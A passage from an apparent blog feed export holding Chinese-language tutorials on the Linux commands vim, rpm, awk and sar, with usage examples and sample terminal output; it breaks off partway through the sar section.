&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此状态下敲击键盘动作会被 vim 识别为命令，而非输入字符。比如此时按 i ，并不回输入一个字符，i 被当作了一个命令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下是常用的几个命令： i 在当前光标所在字符的前面，转为输入模式； a 在当前光标所在字符的后面，转为输入模式； o 在当前光标所在行的下方，新建一行，并转为输入模式； I 在当前光标表所在行的行首，转为输入模式； A 在当前光标所在行的行尾，转为输入模式； O 在当前光标所在行的上方，新建一行，并转为输入模式； x 删除当前光标所在出的字符； ： 切换到底线命令模式，以在最底一行输入命令； ESC 从输入模式切换为命令模式，也可是底线命令模式切换为命令模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：输入模式和底线命令模式之间不能直接切换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若想要编辑文本：启动 vim ，进入了命令模式，按下 i ，切换到输入模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。 输入模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在命令模式下按下 i 就进入了输入模式。在输入模式中，可以使用以下按键： 字符按键以及Shift组合，输入字符 ENTER，回车键，换行 BACK SPACE，退格键，删除光标前一个字符 DEL，删除键，删除光标后一个字符 方向键，在文本中移动光标 HOME/END,移动光标到行首/行尾 Page Up/Page Down，上/下翻页 Insert，切换光标为输入/替换模式，光标将变成竖线/下划线 ESC，退出输入模式，切换到命令模式 底线命令模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在命令模式下按下 :（英文冒号）就进入了底线命令模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在底线命令模式中，基本的命令有： q退出程序 w保存文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按ESC键可随时退出底线命令模式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以将这三个模式想成下图来表示： vim 使用实例使用 vim 进入命令模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 vim 来建立一个名为 test.txt 的文件 1# vim test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;直接输入 vim文件名就能进入 vim 的命令模式了。vim 后面一定要加文件名，不管该文件存在与否。 按 i 进入输入模式（也称为编辑模式），开始编辑文字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在命令模式中，只要按下 i、o、a 等字符就可以进入输入模式了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在编辑模式当中，可以发现在左下角状态栏中会出现 -INSERT-的字样，那就是可以输入任意字符的提示。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个时候，键盘上除了ESC这个键之外，其他的按键都可以视作为一般的输入按钮了，所以可以进行任意的编辑。 按下ESC按键回到一般模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果编辑完毕，就按下ESC这个按键即可马上回到命令模式，这是左下角的 -INSERT-不见了 在命令模式中，按下:wq保存后退出 vim&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存并退出的指令很简单，输入:wq即可保存并退出。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就成功创建了一个 test.txt文件。 vim 按键说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了以上简易范例的 i、ESC、:wq 之外，其实 vim 还有非常多的按键可以使用。 第一部分：命令模式可用的光标移动、复制粘贴、搜索替换等 第二部分：命令模式切换到编辑模式的可以用按键说明 第三部分：命令模式切换到末行指令模式的可以用按键说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;特别注意，在 vim 中，数字是很有意义的！数字通常代表重复做几次的意思！也有可能是代表去到第几个的意思。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;举例来说，要删除50行，则是用50dd，数字加在动作之前；要向下移动20行，20j或是20↓即可。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- rpm]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F74.%20Linux%20%E5%91%BD%E4%BB%A4-%20rpm%2F</url>
    <content type="text"><![CDATA[Linux 命令- rpm&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rpm命令是RPM软件包的管理工具。RPM是 “Redhat Package Manager” 的缩写，根据名字也能猜到这是Redhat公司开发出来的。RPM 是以一种数据库记录的方式来将需要的套件安装到Linux 主机的一套管理程序。也就是说，linux系统中存在着一个关于RPM的数据库，它记录了安装的包以及包与包之间依赖相关性。RPM包是预先在linux机器上编译好并打包好的文件，安装起来非常快捷。但是也有一些缺点，比如安装的环境必须与编译时的环境一致或者相当；包与包之间存在着相互依赖的情况；卸载包时需要先把依赖的包卸载掉，如果依赖的包是系统所必须的，那就不能卸载这个包，否则会造成系统崩溃。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果光驱中还有系统安装盘的话，可以通过 mount /dev/cdrom /mnt 命令把光驱挂载到/mnt目录下，那么会在/mnt/Packages目录下看到很多.rpm的文件，这就是RPM包了。 命令格式1rpm [选项] [参数] 命令选项 -a：查询所有套件； -b&lt;完成阶段&gt;&lt;套件档&gt;+或-t &lt;完成阶段&gt;&lt;套件档&gt;+：设置包装套件的完成阶段，并指定套件档的文件名称； -c：只列出组态配置文件，本参数需配合”-l”参数使用； -d：只列出文本文件，本参数需配合”-l”参数使用； -e&lt;套件档&gt;或–erase&lt;套件档&gt;：删除指定的套件； -f&lt;文件&gt;+：查询拥有指定文件的套件； -h或–hash：套件安装时列出标记； -i：显示套件的相关信息； -i&lt;套件档&gt;或–install&lt;套件档&gt;：安装指定的套件档； -l：显示套件的文件列表； -p&lt;套件档&gt;+：查询指定的RPM套件档； -q：使用询问模式，当遇到任何问题时，rpm指令会先询问用户； -R：显示套件的关联性信息； -s：显示文件状态，本参数需配合”-l”参数使用； -U&lt;套件档&gt;或–upgrade&lt;套件档&gt;：升级指定的套件档； -v：显示指令执行过程； -vv：详细显示指令执行过程，便于排错。 命令参数 软件包：指定要操纵的rpm软件包 使用实例实例1：安装一个rpm123[root@localhost ~]# rpm -ivh /mnt/Packages/libjpeg-turbo-devel-1.2.1-1.el6.i686.rpmPreparing... ########################################### [100%]1:libjpeg-turbo-devel ########################################### [100%] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中libhpeg-turbo-devel-1.2.1-1，el6.i686.rpm 是rpm包的文件名。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外在安装一个rpm常用的附带参数： –force:强制安装，即使覆盖属于其他包的文件也要安装 nodeps：当要安装的rpm包依赖其他包时，几十其他包没有安装，也要安装这个包 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也就是说 rpm -i --force --nodeps 可以忽略所有依赖关系和文件问题，什么包都能安装上，但这种强制安装的软件包不能保证完全发挥功能。 实例2：升级一个rpm包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rpm -Uvh filename &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“-U”即升级的意思 实例3：卸载一个rpm包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rpm -e filename &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@localhost ~]# rpm -qa |grep libjpeg-turbo-devellibjpeg-turbo-devel-1.2.1-1.el6.i686[root@localhost ~]# rpm -e libjpeg-turbo-devel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的filename是通过rpm的查询功能所查询到的。卸载时后边跟的filename和安装时的是有区别的，安装时是把一个存在的文件作为参数，而卸载时只需要包名即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时会出现一些错误或者警告 1... is needed by ... &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这说明这个软件被其他软件需要，不能随便卸载，可以用 rpm -e --nodeps 强制卸载 实例4：如何安装.src.rpm软件包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有些rpm包是以 .src.rpm结尾的，这类rpm包是包含了源代码的rpm包，在安装时需要进行编译。这类rpm包有两种方法安装： 方法一：1234567rpm -i your-package.src.rpm cd /usr/src/redhat/SPECS rpmbuild -bp your-package.specs #一个和软件包同名的specs文件 cd /usr/src/redhat/BUILD/your-package/ #一个和软件包同名的目录 ./configure #这一步和编译普通的源码软件一样，可以加上参数 make make install 方法二：12rpm -i you-package.src.rpm cd /usr/src/redhat/SPECS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前两步和方法一相同 1rpmbuild -bb your-package.specs #一个和软件包同名的specs文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是在 /usr/src/redhat/RPM/i386/（根据提提包的不同，也可能是i686、noarch等等）在这个目录下，有一个新的rpm包，这个是编译好的二进制文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行 rpm -i new-package.rpm即可安装完成。 实例5：不安装但是获取rpm包中的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要使用工具 rpm2cpio和cpio 123rpm2cpio xxx.rpm | cpio -virpm2cpio xxx.rpm | cpio -idmvrpm2cpio xxx.rpm | cpio --extract --make-firectories &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参数i和extract相同，表示提取文件。v表示显示执行进程，d和make-directory相同，表示根据包中文件原来的路径建立目录，m表示保持文件的更新时间。 实例6：查看与rpm包相关的文件和其他信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假设使用rpm包mysql-3.23.54a-11 1. 列出系统中所有安装过的rpm包1rpm -qa &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找所有安装过的包含某个字符串sql的rpm包 1rpm -qa | grep sql 2. 获得某个rpm包的文件全名1rpm -q mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以获得系统中安装的mysql软件包全名，从中可以获得当前软件包的版本信息。此例可以得到信息 mysql-3.23.54a-11 3. 一个rpm包中的文件的安装路径1rpm -ql 包名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：这里的是不包括 .rpm 后缀的rpm包的名称，也就是说这能使用mysql或者mysql-3.23.54a-11而不是mysql-3.23.54a-11.rpm。如果只是想知道可执行程序放到那里去了，也可以用which 1which mysql 4. 一个rpm包中包含哪些文件。 一个没有安装过的rpm包，使用 1rpm -qlp ***.rpm 一个已经安装过的rpm包，还可以使用 1rpm -ql ***.rpm 5. 获取关于一个rpm包的版本，用途等相关信息 一个没有安装过的rpm包，使用 1rpm -qip ***.rpm 一个已经安装过的rpm包，还可以使用 1rpm -qi ***.rpm 6. 某个程序是哪个rpm包安装的，或者哪个rpm包包含这个程序123rpm -qf `which 程序名` #返回软件包的全名 rpm -qif `which 程序名` #返回软件包的有关信息 rpm -qlf `which 程序名` #返回软件包的文件列表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：这里不是引号，而是`(反引号)，就是键盘左上角那个键。也可以使用 rpm -qilf，同时输出rpm包信息和文件列表 7. 某个文件是哪个rpm包安装的，或者哪个rpm包包含这个文件。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，前一个问题中的方法，只适用与可执行的程序，而下面的方法，不仅可以用于可执行程序，也可以用于普通的任何文件。前提是知道这个文件名。首先获得这个程序的完整路径，可以用whereis或者which，然后使用rpm -qf例如： 1234whereis ftptop ftptop: /usr/bin/ftptop /usr/share/man/man1/ftptop.1.gz rpm -qf /usr/bin/ftptop proftpd-1.2.8-1 rpm -qf /usr/share/doc/proftpd-1.2.8/rfc/rfc0959.txt proftpd-1.2.8-1]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- awk]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F71.%20Linux%20%E5%91%BD%E4%BB%A4-%20awk%2F</url>
    <content type="text"><![CDATA[Linux 命令- awk&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;awk 是一种处理文本文件的语言，是一个强大的文本分析工具。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之所以叫AWK是因为其取了三位创始人 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 的Family Name的首字符。 1. 命令格式12awk [选项参数] 'script' var=value file(s)awk [选项参数] -f script var=value file(s) 2. 命令参数 -F fs or –field-separator fs指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F:。 -v var=value or –asign var=value赋值一个用户定义变量。 -f scripfile or –file scriptfile从脚本文件中读取awk命令。 -mf nnn and -mr nnn对nnn值设置内在限制，-mf选项限制分配给nnn的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。 -W compact or –compat, -W traditional or –traditional在兼容模式下运行awk。所以gawk的行为和标准的awk完全一样，所有的awk扩展都被忽略。 -W copyleft or –copyleft, -W copyright or –copyright打印简短的版权信息。 -W help or –help, -W usage or –usage打印全部awk选项和每个选项的简短说明。 -W lint or –lint打印不能向传统unix平台移植的结构的警告。 -W lint-old or –lint-old打印关于不能向传统unix平台移植的结构的警告。 -W posix打开兼容模式。但有以下限制，不识别：/x、函数关键字、func、换码序列以及当fs是一个空格时，将新行作为一个域分隔符；操作符**和**=不能代替\^和^=；fflush无效。 -W re-interval or –re-inerval允许间隔正则表达式的使用，参考(grep中的Posix字符类)，如括号表达式[[:alpha:]]。 -W source program-text or –source program-text使用program-text作为源代码，可与-f命令混用。 -W version or –version打印bug报告信息的版本。 3. 基本用法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;log.txt 文本内容如下 12342 this is a test3 Are you like awkThis's a test10 There are orange,apple,mongo 用法一1awk '&#123;[pattern] action&#125;' &#123;filenames&#125; 实例：每行按空格或TAB分割，输出文本中的1、4行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# awk '&#123;print $1,$4&#125;' log.txt 2 a3 likeThis's 10 orange,apple,mongo[root@localhost ~]# awk '&#123;printf "%-8s %-10s\n",$1,$4&#125;' log.txt #格式化输出2 a 3 like This's 10 orange,apple,mongo 用法二1awk -F &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-F 相当于内置变量 FS ，指定分隔字符 实例：使用分隔符截取文档某段123456789101112131415[root@localhost ~]# awk -F, '&#123;print $1,$2&#125;' log.txt #使用“,”分割2 this is a test 3 Are you like awk This's a test 10 There are orange apple[root@localhost ~]# awk 'BEGIN&#123;FS=","&#125; &#123;print $1,$2&#125;' log.txt #使用内建变量2 this is a test 3 Are you like awk This's a test 10 There are orange apple[root@localhost ~]# awk -F '[ ,]' '&#123;print $1,$2,$5&#125;' log.txt #使用多个分隔符，先使用空格分割，然后对分割结果再使用“,”分割2 this test3 Are awkThis's a 10 There apple &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-F 选项的作用是指定分隔符，如果不加 -F 指定，则以空格或者 tab 为分隔符。print 为打印的动作，用来打印出某个字段。$1 为第一个字段，$2 为第二个字段，以此类推，有一个特殊的就是 $0 ，它表示整行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以使用自定义字符连接每个段，awk 的格式，-F 后紧跟单引号，然后里面为分隔符，print 的动作要用 {} 括起来，否则会报错。print 还可以打印自定义的内容，但是自定义的内容要用双引号括起来。 用法三1awk -v &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-v 设置变量 实例：12345678910[root@localhost ~]# awk -v a=1 '&#123;print $1,$1+a&#125;' log.txt2 33 4This's 110 11[root@localhost ~]# awk -v a=1 -v b=a '&#123;print $1,$1+a,$1b&#125;' log.txt2 3 2a3 4 3aThis's 1 This'sa10 11 10a 用法四1awk -f &#123;awk脚本&#125; [文件名] 实例1awk -f cal.awk log.txt 运算符 运算符 描述 = += -= = /= %= ^= *= 赋值 ?: C条件表达式 \ \ 逻辑或 &amp;&amp; 逻辑与 ~ ~! 匹配正则表达式和不匹配正则表达式 &lt; &lt;= &gt; &gt;= != == 关系运算符 空格 连接 + - 加，减 * / % 乘，除与求余 + - ! 一元加，减和逻辑非 ^ * 求幂 ++ – 增加或减少，作为前缀或后缀 $ 字段引用 in 数组成员 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;过滤第一列大于2的行 1234[root@localhost ~]# awk '$1&gt;2' log.txt3 Are you like awkThis's a test10 There are orange,apple,mongo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;过滤第一列等于2的行 12[root@localhost ~]# awk '$1==2 &#123;print $1,$3&#125;' log.txt2 is &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;过滤第一列大于2并且第二列等于 ‘Are’的行 12[root@localhost ~]# awk '$1&gt;2 &amp;&amp; $2=="Are" &#123;print $1,$2,$3&#125;' log.txt3 Are you 内建变量 变量 描述 \$n 当前记录的第n个字段，字段间由FS分割 \$0 完整的输入记录 ARGC 命令行参数的数目 ARGIND 命令行中当前文件的位置（从0开始算） ARGV 包含命令行参数的数组 CONVFMT 数字转换格式（默认值为%.6g）ENVIRON环境变量关联数组 ERRNO 最后一个系统错误的描述 FIELDWIDTHS 字段宽度列表（用空格键分割） FILENAME 当前文件名 FNR 个文件分别计数的行号 FS 字段分割符（默认是任何空格） IGNORECASE 如果为真，则进行忽略大小写的匹配 NF 输入字段的分隔符 NR 已经读出的记录数，就是行号，从1开始 OFMT 数字的输出格式（默认值是%.6g） OFS 输出记录分隔符（输出换行符），输出时用指定的符号代替换行符 ORS 输出记录分隔符（默认值是一个换行符） RLENGTH 由 match 函数所匹配的字符串的长度 RS 记录分隔符（默认是一个换行符） RSTART 由 match 函数所匹配的字符串的第一个位置 SUBSEP 数组下标分隔符（默认值是/034） 12345678910111213141516171819202122232425262728$ awk 'BEGIN&#123;printf "%4s %4s %4s %4s %4s %4s %4s %4s %4s\n","FILENAME","ARGC","FNR","FS","NF","NR","OFS","ORS","RS";printf "---------------------------------------------\n"&#125; &#123;printf "%4s %4s %4s %4s %4s %4s %4s %4s %4s\n",FILENAME,ARGC,FNR,FS,NF,NR,OFS,ORS,RS&#125;' log.txtFILENAME ARGC FNR FS NF NR OFS ORS RS---------------------------------------------log.txt 2 1 5 1log.txt 2 2 5 2log.txt 2 3 3 3log.txt 2 4 4 4$ awk -F\' 'BEGIN&#123;printf "%4s %4s %4s %4s %4s %4s %4s %4s %4s\n","FILENAME","ARGC","FNR","FS","NF","NR","OFS","ORS","RS";printf "---------------------------------------------\n"&#125; &#123;printf "%4s %4s %4s %4s %4s %4s %4s %4s %4s\n",FILENAME,ARGC,FNR,FS,NF,NR,OFS,ORS,RS&#125;' log.txtFILENAME ARGC FNR FS NF NR OFS ORS RS---------------------------------------------log.txt 2 1 ' 1 1log.txt 2 2 ' 1 2log.txt 2 3 ' 2 3log.txt 2 4 ' 1 4# 输出顺序号 NR, 匹配文本行号$ awk '&#123;print NR,FNR,$1,$2,$3&#125;' log.txt---------------------------------------------1 1 2 this is2 2 3 Are you3 3 This's a test4 4 10 There are# 指定输出分割符$ awk '&#123;print $1,$2,$5&#125;' OFS=" $ " log.txt---------------------------------------------2 $ this $ test3 $ Are $ awkThis's $ a $10 $ There $ 使用正则，字符串匹配&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出第二列包含 “th”，并打印第二列与第四列 12[root@localhost ~]# awk '$2 ~ /th/ &#123;print $2,$4&#125;' log.txtthis a &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; ~ 表示模式开始。//中是模式。 123[root@localhost ~]# awk '/re/' log.txt3 Are you like awk10 There are orange,apple,mongo 忽略大小写123[root@localhost ~]# awk 'BEGIN&#123;IGNORECASE=1&#125; /this/' log.txt2 this is a testThis's a test 模式取反12345678[root@localhost ~]# awk '$2 !~ /th/ &#123;print $2,$4&#125;' log.txtAre likea There orange,apple,mongo[root@localhost ~]# awk '! /th/ &#123;print $2,$4&#125;' log.txtAre likea There orange,apple,mongo awk 脚本&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于 awk 脚本，需要注意两个关键词 BEGIN 和 END。 BEGIN {这里面放的是执行前的语句｝ END ｛这里面放的是处理完所有的行后要执行的语句｝ ｛这里面放的是处理每一行时要执行的语句｝ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假设有这么一个文件（学生成绩表） 123456[root@localhost ~]# cat score.txt Marry 2143 78 84 77Jack 2321 66 78 45Tom 2122 48 77 71Mike 2537 87 97 95Bob 2415 40 57 62 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;awk 脚本如下 123456789101112131415161718192021222324[root@localhost ~]# cat cal.awk#!/bin/awk -f#运行前BEGIN &#123; math = 0 english = 0 computer = 0 printf "NAME NO. MATH ENGLISH COMPUTER TOTAL\n" printf "---------------------------------------------\n"&#125;#运行中&#123; math+=$3 english+=$4 computer+=$5 printf "%-6s %-6s %4d %8d %8d %8d\n", $1, $2, $3,$4,$5, $3+$4+$5&#125;#运行后END &#123; printf "---------------------------------------------\n" printf " TOTAL:%10d %8d %8d \n", math, english, computer printf "AVERAGE:%10.2f %8.2f %8.2f\n", math/NR, english/NR, computer/NR&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行结果 1234567891011[root@localhost ~]# awk -f cal.awk score.txtNAME NO. MATH ENGLISH COMPUTER TOTAL---------------------------------------------Marry 2143 78 84 77 239Jack 2321 66 78 45 189Tom 2122 48 77 71 196Mike 2537 87 97 95 279Bob 2415 40 57 62 159--------------------------------------------- TOTAL: 319 393 350 AVERAGE: 63.80 78.60 70.00 另外一些实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;awk 的 hello world 程序为： 1BEGIN &#123;print "Hello, world!"&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;计算文件大小 12[root@localhost ~]# ls -l *.txt | awk '&#123;sum+=$6&#125; END &#123;print sum&#125;'30 &#160;&#160;&#160;&#160;&#160;&#160;&#160;从文件中找出长度大于80的行 1awk 'lenght&gt;80' log.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;打印九九乘法表 1seq 9 | sed 'H;g' | awk -v RS='' '&#123;for(i=1;i&lt;=NF;i++)printf("%dx%d=%d%s", i, NR, i*NR, i==NR?"\n":"\t")&#125;']]></content>
      <tags>
        <tag>正则表达式</tag>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- sar]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F78.Linux%20%E5%91%BD%E4%BB%A4-%20sar%2F</url>
    <content type="text"><![CDATA[Linux 命令- sar&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sar（System ActivityReporter系统活动情况报告）是目前Linux上最为全面的系统性能分析工具之一，可以从多方面对系统的活动进行报告，包括：文件的读写情况、系统调用的使用情况、磁盘I/O、CPU效率、内存使用状况、进程活动及IPC有关的活动等。它不同于其他系统状态监控工具的地方在于，它可以打印历史信息，可以显示当天从零点开始到当前时刻的系统状态信息。如果你系统没有安装这个命令，请使用 yum install -y sysstat 命令安装。初次使用sar命令会报错，那是因为sar工具还没有生成相应的数据库文件（时时监控就不会了，因为不用去查询那个库文件）。它的数据库文件在 “/var/log/sa/” 目录下，默认保存一个月。 命令格式1sar [选项] [时间间隔] [次数] 命令选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sar命令的选项很多，下面只列出常用选项： -A:所有报告的总和 -b:显示I/O和传递速率的统计信息 -B:显示换页状态 -d:输出每一块磁盘的使用信息 -e:设置显示报告的结束时间 -f:从制定的文件读取报告 -i:设置状态信息刷新的间隔时间 -P:报告每个CPU的状态 -R:显示内存状态 –u:输出cpu使用情况和统计信息 –v:显示索引节点、文件和其他内核表的状态 -w:显示交换分区的状态 -x:显示给定进程的装 -r:报告内存利用率的统计信息 使用实例实例1：统计CPU的使用情况，每间隔1秒钟统计一次，总共统计三次&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -u 1 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# sar -u 1 3Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时27分59秒 CPU %user %nice %system %iowait %steal %idle13时28分00秒 all 0.00 0.00 0.50 0.00 0.00 99.5013时28分01秒 all 0.00 0.00 0.25 0.00 0.00 99.7513时28分02秒 all 0.25 0.00 1.00 0.50 0.00 98.26平均时间: all 0.08 0.00 0.58 0.17 0.00 99.17 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #%user #用户空间的CPU使用 #%nice 改变过优先级的进程的CPU使用率 #%system 内核空间的CPU使用率 #%iowait CPU等待IO的百分比 #%steal 虚拟机的虚拟机CPU使用的CPU #%idle 空闲的CPU &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在以上的显示当中，主要看%iowait和%idle，%iowait过高表示存在I/O瓶颈，即磁盘IO无法满足业务需求，如果%idle过低表示CPU使用率比较严重，需要结合内存使用等情况判断CPU是否瓶颈。 实例2：每个CPU的使用状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -p 1 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# sar -p 1 3 Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时31分16秒 CPU %user %nice %system %iowait %steal %idle13时31分17秒 all 0.00 0.00 0.25 0.00 0.00 99.7513时31分18秒 all 0.25 0.00 0.50 0.00 0.00 99.2613时31分19秒 all 0.00 0.00 0.25 0.00 0.00 99.75平均时间: all 0.08 0.00 0.33 0.00 0.00 99.58 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #CPU 所有CPU的统计 #%user 用户态的CPU使用统计 #%nice 更改过优先级的进程的CPU使用统计 #%iowait CPU等待IO数据的百分比 #%steal 虚拟机的vCPU占用的物理CPU的百分比 #%idle 空闲的CPU百分比 实例3：查看平均负载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -q &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# sar -q 2 2Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时35分07秒 runq-sz plist-sz ldavg-1 ldavg-5 ldavg-1513时35分09秒 0 167 0.00 0.00 0.0013时35分11秒 0 167 0.00 0.00 0.00平均时间: 0 167 0.00 0.00 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #runq-sz 运行队列的长度（等待运行的进程数，每核的CP不能超过3个） #plist-sz 进程列表中的进程（processes）和线程数（threads）的数量 #ldavg-1 最后1分钟的CPU平均负载，即将多核CPU过去一分钟的负载相加再除以核心数得出的平均值，5分钟和15分钟以此类推 #ldavg-5 最后5分钟的CPU平均负载 #ldavg-15 最后15分钟的CPU平均负载 实例4：查看内存使用情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -r &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# sar -r 1 2Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时38分01秒 kbmemfree kbmemused %memused kbbuffers kbcached kbcommit %commit13时38分02秒 1507864 398688 20.91 19632 176552 237716 3.9013时38分03秒 1507864 398688 20.91 19632 176552 237716 3.90平均时间: 1507864 398688 20.91 19632 176552 237716 3.90 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #kbmemfree 空闲的物理内存大小 #kbmemused 使用中的物理内存大小 #%memused 物理内存使用率 #kbbuffers 内核中作为缓冲区使用的物理内存大小，kbbuffers和kbcached:这两个值就是free命令中的buffer和cache. #kbcached 缓存的文件大小 #kbcommit 保证当前系统正常运行所需要的最小内存，即为了确保内存不溢出而需要的最少内存（物理内存+Swap分区） #commit 这个值是kbcommit与内存总量（物理内存+swap分区）的一个百分比的值 实例5：查看系统swap分区的统计信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -W &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# sar -W 1 2Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时40分51秒 pswpin/s pswpout/s13时40分52秒 0.00 0.0013时40分53秒 0.00 0.00平均时间: 0.00 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #pswpin/s 每秒从交换分区到系统的交换页面（swap page）数量 #pswpott/s 每秒从系统交换到swap的交换页面（swap page）的数量 实例6：查看I/O和传递速率的统计信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -b &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# sar -b 1 3Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时43分10秒 tps rtps wtps bread/s bwrtn/s13时43分11秒 0.00 0.00 0.00 0.00 0.0013时43分12秒 0.00 0.00 0.00 0.00 0.0013时43分13秒 0.00 0.00 0.00 0.00 0.00平均时间: 0.00 0.00 0.00 0.00 